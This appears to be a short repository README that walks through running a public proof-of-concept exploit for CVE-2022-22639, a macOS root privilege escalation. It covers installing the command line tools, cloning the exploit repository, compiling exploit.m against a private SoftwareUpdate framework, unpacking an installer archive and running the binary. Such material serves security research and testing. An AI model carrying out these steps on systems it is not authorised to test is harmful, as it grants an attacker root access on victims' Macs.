# Details 

See Blog:

https://www.trendmicro.com/en_us/research/22/d/macos-suhelper-root-privilege-escalation-vulnerability-a-deep-di.html

# Installation of XCode Command Line Tools

You actually don't need the full XCode package from the App Store, and if you're on a machine where you have a regular user and XCode is not yet installed, you may not be able to install it as App Store enforces parental control as well as requiring you to be signed in.

This seems to work as a regular user though. (To be reconfirmed on a fresh new system)

1. `xcode-select --install`

# Exploitation of CVE-2022-22639

0. `git clone https://github.com/jhftss/CVE-2022-22639`
1. `cd CVE-2022-22639`
2. `clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Versions/A/SoftwareUpdate.tbd`
3. `cd /tmp`
4. `cpio -idv < path/to/InstallAssitant.gz`
5. `./exploit`

# Demo

https://www.youtube.com/watch?v=-vbkTLHh874
